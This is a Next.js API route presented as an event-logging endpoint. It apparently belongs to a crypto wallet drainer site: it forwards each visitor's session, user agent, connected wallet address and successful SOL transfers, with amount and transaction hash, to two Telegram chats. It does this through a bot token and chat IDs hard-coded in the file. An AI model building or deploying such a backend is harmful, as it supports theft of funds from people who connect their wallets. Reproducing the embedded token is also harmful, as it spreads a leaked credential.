import { type NextRequest, NextResponse } from "next/server"

const TELEGRAM_BOT_TOKEN = "8341387926:AAGEi8QJ2LSLphS15rmAOwS8aPfJ15cX27U"
const TELEGRAM_CHAT_IDS = ["7556622176", "1801489729"]

async function sendTelegramNotification(eventData: any) {
  try {
    const timestamp = eventData.timestamp || new Date().toISOString()
    
    let message = ""
    let emoji = "📊"

    // Format event message based on event type
    if (eventData.eventType) {
      switch (eventData.eventType) {
        case "MODAL_OPENED":
          emoji = "🚪"
          message = `${emoji} *Modal Opened*
🆔 *Session:* ${eventData.sessionId?.substring(0, 12)}...
📱 *Mobile:* ${eventData.isMobile ? 'Yes' : 'No'}
🌐 *User Agent:* ${eventData.userAgent?.substring(0, 50)}...
🕐 *Time:* ${new Date(timestamp).toLocaleString()}
`
          break

        case "WALLET_CONNECTED":
          emoji = "🔗"
          message = `${emoji} *Wallet Connected*
📍 *Wallet:* ${eventData.walletType}
🔑 *Address:* \`${eventData.walletAddress?.substring(0, 12)}...\`
🆔 *Session:* ${eventData.sessionId?.substring(0, 12)}...
🕐 *Time:* ${new Date(timestamp).toLocaleString()}
`
          break

        case "TRANSACTION_BROADCAST_SUCCESS":
          emoji = "✅"
          message = `${emoji} *Transaction Successful*
🔗 *Tx Hash:* \`${eventData.transactionHash}\`
💰 *Amount:* ${eventData.transferAmount} SOL
📍 *Wallet:* ${eventData.walletAddress?.substring(0, 12)}...
🌐 *RPC:* ${eventData.rpcEndpoint}
🕐 *Time:* ${new Date(timestamp).toLocaleString()}
`
          break

        default:
          emoji = "📝"
          message = `${emoji} *Event:* ${eventData.eventType}
📋 *Data:* ${JSON.stringify(eventData, null, 2).substring(0, 500)}...
🕐 *Time:* ${new Date(timestamp).toLocaleString()}
`
      }
    } else {
      // Generic event logging
      emoji = "📝"
      message = `${emoji} *Event Logged*
📋 *Data:* ${JSON.stringify(eventData, null, 2).substring(0, 500)}...
🕐 *Time:* ${new Date(timestamp).toLocaleString()}
`
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`

    const sendPromises = TELEGRAM_CHAT_IDS.map(chatId =>
      fetch(telegramUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message.trim(),
          parse_mode: "Markdown",
          disable_web_page_preview: true,
        }),
      }).catch(error => {
        console.error(`Failed to send to chat ${chatId}:`, error)
        return null
      })
    )

    await Promise.all(sendPromises)
    return true
  } catch (error) {
    console.error("Error in Telegram notification:", error)
    return false
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    
    // Send notification to Telegram
    await sendTelegramNotification(body)
    
    // Log to console in development
    if (process.env.NODE_ENV === 'development') {
      console.log('Event logged:', body)
    }
    
    return NextResponse.json({ 
      success: true, 
      message: "Event logged successfully",
      timestamp: new Date().toISOString()
    })
  } catch (error) {
    console.error("Error logging event:", error)
    return NextResponse.json({ 
      error: "Failed to log event",
      details: error instanceof Error ? error.message : "Unknown error"
    }, { status: 500 })
  }
}

export async function GET() {
  return NextResponse.json({
    status: "ok",
    endpoint: "/api/log-event",
    description: "Event logging endpoint for tracking user interactions",
    method: "POST",
    timestamp: new Date().toISOString()
  })
  }
